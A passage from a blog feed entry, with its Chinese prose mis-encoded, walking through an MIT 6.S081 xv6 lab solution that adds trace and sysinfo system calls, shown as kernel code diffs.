inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static char *syscall_names[] = &#123;</span><span class="token prefix inserted">+</span><span class="token line">"dummy",  "fork",  "exit",  "wait",  "pipe",</span><span class="token prefix inserted">+</span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix inserted">+</span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix inserted">+</span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>@@ -138,6 +149,11 @@ syscall(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  num = p->trapframe->a7;</span><span class="token prefix unchanged"> </span><span class="token line">  if(num > 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    p->trapframe->a0 = syscalls[num]();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: syscall %s -> %d\n", p->pid, syscall_names[num], p->trapframe->a0);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    printf("%d %s: unknown sys call %d\n",</span><span class="token prefix unchanged"> </span><span class="token line">            p->pid, p->name, num);</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..756d191 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..3ff51d9 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -95,3 +95,11 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_trace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..16107d6 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int trace(int); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..76c64ec 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file</code></pre><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>åœ¨å®Œæ•´æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç†Ÿæ‚‰äº†æ•´ä½“æµç¨‹ä¹‹åï¼Œæœ¬é¢˜ç›¸å¯¹å°±æ¯”è¾ƒè½»æ¾äº†ã€‚å£°æ˜æ·»åŠ çš„æ“ä½œå°±è·³è¿‡ä¸è°ˆäº†ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ <code>sys_sysinfo</code> çš„å®ç°ï¼šå³è·å– <code>freemem</code> å’Œ <code>nproc</code> çš„ä¿¡æ¯å¹¶å°†å…¶å¡«å……åˆ°å‚æ•° <code>sysinfo</code> æŒ‡é’ˆå¯¹åº”çš„åœ°å€å¤„ã€‚</p><p>è¿™ä¸ªå¤§çš„ç›®æ ‡å¯ä»¥æ‹†åˆ†ä¸º 3 ä¸ªå°ç›®æ ‡ï¼š</p><ol><li>å¦‚ä½•è·å– <code>freemem</code> çš„ä¿¡æ¯ï¼Ÿ</li><li>å¦‚ä½•è·å– <code>nproc</code> çš„ä¿¡æ¯ï¼Ÿ</li><li>å¦‚ä½•å°†æ•°æ®å¡«å……å…¥æŒ‡å®šçš„åœ°å€ä¸­ï¼ˆç”¨æˆ·ç©ºé—´ï¼‰ï¼Ÿ</li></ol><h3 id="è·å–-freemem-çš„ä¿¡æ¯"><a href="#è·å–-freemem-çš„ä¿¡æ¯" class="headerlink" title="è·å– freemem çš„ä¿¡æ¯"></a>è·å– <code>freemem</code> çš„ä¿¡æ¯</h3><p>ä»”ç»†é˜…è¯» <code>kernel/kalloc.c</code> çš„ä»£ç ï¼Œå¯ä»¥å‘ç°ä¸€äº›å…³é”®ä¿¡æ¯ï¼š</p><ul><li><code>struct run</code>ï¼šç”¨æ¥å†…å­˜åˆ†é…å•å…ƒçš„æ•°æ®ç»“æ„ï¼Œæœ¬èº«çš„åœ°å€å³ä¸ºæ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€ï¼ŒåŒ…å«ä¸€ä¸ª <code>next</code> æŒ‡é’ˆï¼Œç”¨äºå®ç°é“¾è¡¨ã€‚</li><li><code>kmem.freelist</code>ï¼šç©ºé—²é“¾è¡¨ï¼Œå­˜å‚¨ç€ä¸€ç³»åˆ—æŒ‡å‘ç©ºé—²ç©ºé—´çš„æŒ‡é’ˆã€‚</li><li><code>PGSIZE</code>ï¼šå†…å­˜åˆ†é…é¡µçš„å¤§å°ï¼Œå³æ¯ä¸ª <code>struct run *</code> æ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´çš„å¤§å°ã€‚</li></ul><p>äº†è§£äº†ä¸Šè¿°ä¿¡æ¯åï¼Œè®¡ç®—ç©ºé—²ç©ºé—´çš„å¤§å°å°±å¾ˆç®€å•äº†ï¼Œåªéœ€è¦è®¡ç®—ç©ºé—²é“¾è¡¨çš„é•¿åº¦ <code>n</code>ï¼Œç©ºé—²å†…å­˜çš„ç©ºé—´å¤§å°å³ä¸º <code>n * PGSIZE</code>ã€‚</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>uint64 bytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">run</span> <span class="token operator">*</span>r<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> kmem<span class="token punctuation">.</span>freelist<span class="token punctuation">;</span> r<span class="token punctuation">;</span> r <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>bytes <span class="token operator">+=</span> PGSIZE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> bytes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="è·å–-nproc-çš„ä¿¡æ¯"><a href="#è·å–-nproc-çš„ä¿¡æ¯" class="headerlink" title="è·å– nproc çš„ä¿¡æ¯"></a>è·å– <code>nproc</code> çš„ä¿¡æ¯</h3><p>ä¸ä¸Šé¢ä¸€æ ·ï¼Œé˜…è¯» <code>kernel/proc.c</code> çš„ä»£ç ï¼Œå¯çŸ¥ï¼š</p><ul><li><code>struct proc proc[NPROC]</code> ï¼šè¿›ç¨‹æ•°ç»„ï¼Œå­˜å‚¨ç€æ‰€æœ‰è¿›ç¨‹çš„ <code>struct proc</code>.</li><li><code>UNUSED</code>ï¼š<code>struct proc</code> ä¸­ <code>enum procstate</code> çš„ç±»å‹ä¹‹ä¸€ï¼Œä»£è¡¨æœ¬ <code>struct proc</code> æœªè¢«ä½¿ç”¨ã€‚</li></ul><p>é‚£ä¹ˆè¦å¾—åˆ°å½“å‰ç³»ç»Ÿä¸­è¿›ç¨‹çš„æ•°é‡ï¼Œåªéœ€è¦éå†æ•´ä¸ª <code>proc</code>ï¼Œè®¡ç®—æœªå¤„äº <code>UNUSED</code> çŠ¶æ€çš„è¿›ç¨‹æ•°é‡å³å¯ã€‚</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>uint64 num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> proc<span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token operator">&amp;</span>proc<span class="token punctuation">[</span>NPROC<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>num <span class="token operator">+=</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>state <span class="token operator">!=</span> UNUSED<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="å°†æ•°æ®å¡«å……å…¥æŒ‡å®šçš„åœ°å€ä¸­"><a href="#å°†æ•°æ®å¡«å……å…¥æŒ‡å®šçš„åœ°å€ä¸­" class="headerlink" title="å°†æ•°æ®å¡«å……å…¥æŒ‡å®šçš„åœ°å€ä¸­"></a>å°†æ•°æ®å¡«å……å…¥æŒ‡å®šçš„åœ°å€ä¸­</h3><p>å¾—åˆ° <code>freemem</code> å’Œ <code>nproc</code> ä¹‹åï¼Œå°±éœ€è¦å°†æ•°æ®å†™å…¥ <code>sysinfo</code> çš„å‚æ•° <code>struct sysinfo *</code> æŒ‡å‘çš„å†…å­˜åŒºåŸŸï¼Œè·å–å‚æ•°çš„æ–¹æ³•å’Œ <code>tracing</code> ç±»ä¼¼ï¼Œä¸è¿‡ç”±äºå‚æ•°æ˜¯æŒ‡é’ˆç±»å‹ï¼Œå› æ­¤é‡‡ç”¨ <code>argaddr</code>ã€‚æœ€åï¼Œä»¿ç…§ <code>kernel/file.c</code> ä¸­çš„æ“ä½œï¼Œä½¿ç”¨ <code>copyout</code> å°†å†…æ ¸åŒºåŸŸçš„æ•°æ®å†™å…¥ç”¨æˆ·ç©ºé—´ä¸­ã€‚</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_sysinfo</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">myproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sysinfo</span> info<span class="token punctuation">;</span>uint64 addr<span class="token punctuation">;</span>info<span class="token punctuation">.</span>freemem <span class="token operator">=</span> <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>info<span class="token punctuation">.</span>nproc <span class="token operator">=</span> <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get argument addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">argaddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// copy data of info to addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copyout</span><span class="token punctuation">(</span>p<span class="token operator">-></span>pagetable<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>info<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 6647da5..cfb5119 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -194,6 +194,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_trace\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_sysinfotest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..b2dbb8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          freemem_bytes(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -104,6 +105,7 @@ void            yield(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">int             either_copyin(void *dst, int user_src, uint64 src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">void            procdump(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          proc_num(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// swtch.S</span><span class="token prefix unchanged"> </span><span class="token line">void            swtch(struct context*, struct context*);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..686d84e 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -80,3 +80,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 freemem_bytes(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 bytes = 0;</span><span class="token prefix inserted">+</span><span class="token line">struct run *r;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">for (r = kmem.freelist; r; r = r->next) &#123;</span><span class="token prefix inserted">+</span><span class="token line">bytes += PGSIZE;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return bytes;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/proc.c b/kernel/proc.cindex f4bd5c2..ed6eec4 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -657,3 +657,15 @@ procdump(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("\n");</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 proc_num(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p;</span><span class="token prefix inserted">+</span><span class="token line">uint64 num = 0;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">for(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;</span><span class="token prefix inserted">+</span><span class="token line">num += (p->state != UNUSED);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return num;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/syscall.c b/kernel/syscall.cindex b5b8291..6fed4f2 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -105,6 +105,7 @@ extern uint64 sys_wait(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sysinfo(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_trace]   sys_trace,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sysinfo] sys_sysinfo,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// here</span></span>@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix unchanged"> </span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix unchanged"> </span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace", "sysinfo",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex 756d191..7954d98 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,4 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sysinfo 23</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3ff51d9..644638f 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span><span class="token coord">@@ -6,6 +6,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "memlayout.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "spinlock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "proc.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "sysinfo.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">uint64</span><span class="token prefix unchanged"> </span><span class="token line">sys_exit(void)</span></span>@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">return -1;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sysinfo(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">struct sysinfo info;</span><span class="token prefix inserted">+</span><span class="token line">uint64 addr;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">info.freemem = freemem_bytes();</span><span class="token prefix inserted">+</span><span class="token line">info.nproc = proc_num();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// get argument addr</span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(0, &amp;addr) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// copy data of info to addr</span><span class="token prefix inserted">+</span><span class="token line">if (copyout(p->pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex 16107d6..37d15a5 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span><span class="token coord">@@ -1,5 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct stat;</span><span class="token prefix unchanged"> </span><span class="token line">struct rtcdate;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct sysinfo; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// system calls</span><span class="token prefix unchanged"> </span><span class="token line">int fork(void);</span></span>@@ -24,6 +25,7 @@ char* sbrk(int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">int trace(int); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sysinfo(struct sysinfo *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 76c64ec..fde7c87 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,4 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sysinfo")</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xv6ç³»ç»Ÿè°ƒç”¨å®ç°&quot;&gt;&lt;a href=&quot;#xv6ç³»ç»Ÿè°ƒç”¨å®ç°&quot; class=&quot;headerlink&quot; title=&quot;xv6ç³»ç»Ÿè°ƒç”¨å®ç°&quot;&gt;&lt;/a&gt;xv6ç³»ç»Ÿè°ƒç”¨å®ç°&lt;/h1&gt;&lt;p&gt;ä¸åŒäº Lab1 åˆ©ç”¨å·²å®ç°çš„ç³»ç»Ÿè°ƒç”¨æ¥å®ç°ä¸€äº›ç”¨æˆ·æ€ä¸‹çš„å‘½ä»¤è¡Œç¨‹åºï¼Œæœ¬ Lab æ˜¯</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/</id>
    <published>2024-06-24T12:45:11.000Z</published>
    <updated>2024-06-26T02:10:33.161Z</updated>
    
